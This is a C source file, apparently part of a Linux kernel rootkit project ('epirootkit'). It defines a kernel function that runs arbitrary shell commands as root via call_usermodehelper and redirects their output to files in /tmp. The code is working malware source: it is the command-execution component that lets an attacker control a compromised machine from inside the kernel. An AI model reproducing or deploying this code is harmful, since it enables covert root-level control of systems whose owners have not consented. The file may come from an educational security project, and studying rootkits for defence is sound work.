#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/slab.h>

#include "epirootkit.h"

/**
 * @brief Executes a command string in user mode.
 *
 * @param user_cmd A pointer to a null-terminated string containing the command to execute.
 * @param catch_stds A boolean flag indicating whether to catch standard output and error.
 * @return int - Returns 0 on success, -ENOMEM if memory allocation fails, or -ENOENT if the output file cannot be opened.
 */
int exec_str_as_command(char *user_cmd, bool catch_stds) {
    struct subprocess_info *sub_info = NULL; // Structure used to spawn a userspace process
    char *cmd = NULL;
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = {
        "HOME=/",
        "TERM=xterm",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/tmp",
        NULL
    };
    char *stdout_file = STDOUT_FILE; // File to store stdout
    char *stderr_file = STDERR_FILE; // File to store stderr
    int status = 0;                  // Return code and number of bytes read

    while (*user_cmd == ' ' || *user_cmd == '\t' || *user_cmd == '\n')
        user_cmd++; // Skip leading whitespace

    // Allocate memory for the command string
    cmd = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    if (!cmd)
        return -ENOMEM;

    // Check if the command contains redirection operators
    // Needed because we usually redirect stdout and stderr to /tmp/std.out and /tmp/std.err
    // If the user has specified redirection, we need to handle it
    char *redirect_stderr_add = strstr(user_cmd, "2>"); // Check for stderr redirection
    char *redirect_stdout_add = strstr(user_cmd, ">");  // Check for stdout redirection
    bool user_redirect_stderr = (redirect_stderr_add != NULL);
    bool user_redirect_stdout = (redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL);

    if ((user_redirect_stderr && user_redirect_stdout) || !catch_stds)
        snprintf(cmd, STD_BUFFER_SIZE, "%s", user_cmd);
    else if (user_redirect_stderr)
        snprintf(cmd, STD_BUFFER_SIZE, "%s > %s", user_cmd, stdout_file);
    else if (user_redirect_stdout)
        snprintf(cmd, STD_BUFFER_SIZE, "%s 2> %s", user_cmd, stderr_file);
    else
        snprintf(cmd, STD_BUFFER_SIZE, "%s > %s 2> %s", user_cmd, stdout_file, stderr_file);

    // Prepare the command arguments
    argv[2] = cmd;

    DBG_MSG("exec_str_as_command: executing command: %s\n", cmd);

    // Prepare to run the command
    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!sub_info) {
        kfree(cmd);
        return -ENOMEM;
    }

    // Execute the command and wait for it to finish
    status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);

    kfree(cmd);

    return status;
}